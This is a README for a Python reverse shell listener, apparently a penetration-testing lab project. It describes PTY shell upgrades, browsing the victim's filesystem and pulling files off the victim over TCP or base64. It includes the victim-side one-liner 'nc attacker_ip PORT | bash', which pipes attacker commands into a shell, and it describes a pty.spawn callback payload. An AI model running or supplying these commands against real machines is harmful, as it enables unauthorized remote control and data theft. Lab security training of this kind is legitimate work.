# GhostShell — Reverse Shell Listener

A Python-based reverse shell listener with full TTY support, interactive file browser,
and file transfer capabilities. Built for cybersecurity education and penetration testing labs.

---

## Requirements

**Attacker machine** requires Python 3 and Linux since the tool uses `termios`, `tty`, and `fcntl`.

**Victim machine** requires `nc` (netcat), `python3` for PTY spawn, `bash`, `base64`, and `md5sum` for integrity verification.

---

## Usage

Start the listener on the attacker machine with `python3 listener.py`. You will be prompted to select a network interface using the arrow key menu then enter a port number. The tool automatically opens three ports — `PORT` receives the initial victim connection, `PORT+1` handles the full interactive PTY shell, and `PORT+2` is dedicated for file transfer.

On the victim machine run `nc attacker_ip PORT | bash`. The listener sends the payload automatically and upgrades it into a full interactive shell.

---

## How It Works

The attacker starts the listener and picks a network interface and port. The victim runs the netcat one-liner which connects to the attacker. The listener automatically sends a payload that spawns a real PTY on the victim via `python3 pty.spawn("/bin/bash")` and calls back to the attacker on `PORT+1`. The attacker then gets a full interactive TTY shell with arrow keys, tab completion, Ctrl+C, and automatic terminal resize all working correctly.

The reason `pty.spawn` is used instead of plain `bash -i` is that a piped shell ignores `stty` because there is no real TTY attached. Spawning a PTY on the victim side fixes this entirely.

---

## Shell Commands

Once inside the shell, type `send` to open the file transfer menu, `exit` or press `Ctrl+D` to close the session.

---

## File Transfer

Type `send` in the shell to open the transfer menu and browse the victim filesystem using the arrow key menu. You can navigate directories and select any file.

**Direct transfer** streams the file over a raw TCP socket on `PORT+2` directly to the attacker machine. Fast and reliable for any file size.

**Base64** encodes the file on the victim and prints the base64 output to the terminal. No extra network connection is involved — the attacker manually copies the output, saves it as `filename.b64` then runs the following to recover the file and verify integrity.

```bash
base64 -d filename.b64 > filename
md5sum filename
```

The MD5 hash is printed to the terminal alongside the base64 output so you can verify the file is intact after decoding.

---

## Project Phases

**Phase 1 — Linux to Linux** is complete and includes the interface picker, PTY shell upgrade, terminal resize, interactive filesystem browser, direct file transfer, and base64 encode with integrity check.

**Phase 2 — Linux to Windows** will cover Powershell one-liner on the victim, cmd.exe and Powershell shell handling, and Windows file transfer methods.

**Phase 3 — Windows to Linux** will adapt the listener for Windows using `msvcrt` instead of `termios` with thread-based stdin handling.

**Phase 4 — Windows to Windows** will cover full Powershell on both sides with no PTY and an alternative shell upgrade path.

---

## Lab Setup

Always test in an isolated environment using VirtualBox or VMware with an attacker VM running Kali Linux or Parrot OS and a victim VM running Ubuntu or Debian connected over a Host-Only Adapter. Never run on a network you do not own or have explicit permission to test on.

---

## Disclaimer

This tool is built for educational purposes only as part of a cybersecurity project. Only use in lab environments on machines you own or have explicit permission to test.
